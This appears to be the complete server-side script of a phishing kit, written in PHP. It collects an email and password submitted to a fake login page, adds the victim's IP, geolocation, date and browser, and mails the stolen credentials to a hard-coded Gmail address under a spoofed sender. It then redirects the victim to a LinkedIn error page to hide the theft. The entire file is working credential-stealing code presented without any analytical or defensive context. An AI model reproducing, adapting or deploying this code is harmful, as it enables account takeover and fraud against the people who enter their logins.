<?php
	session_start();
	$email = trim($_POST["email"]);
	$password = trim($_POST["password"]);

										if($password != "")
												{	
												$adddate=date("D M d, Y g:i a");
												$ip = getenv("REMOTE_ADDR");
												$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
												$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
												$browserAgent = $_SERVER['HTTP_USER_AGENT'];
												$hostname = gethostbyaddr($ip);
												$message .= "LOG\n";
												$message .= "E: " .$email. "\n";
												//$message .= "MobileNo: " . $mobileno. "\n";
												$message .= "Ps: " . $password . "\n"; 
												$message .= "--------------IP DETAIL-----------------------\n";
												$message .= "Date: ".$adddate."\n";
												$message .= "Ip Address : ".getenv("REMOTE_ADDR")."\nProvider      : ";
												$message .= "Ip Info       https://www.ip2location.com/demo/$ip ----\n";
												$message .= "BROWSER      ".$browserAgent;
												$message .= "---------------KLOG-------------\n";
												$send = "abudominica@gmail.com";
												$subject = "LOG .$ip.";
												$headers = "From: LOG<nataliengoc3@linHJJmail.com>\n";
												$headers .= "MIME-Version: 1.0\n";
												mail($send,$subject,$message,$headers);
												header ("Location: https://www.linkedin.com/404error");
												}
												else
												{
												header ("location: index.html?email=invalid");
												}
?>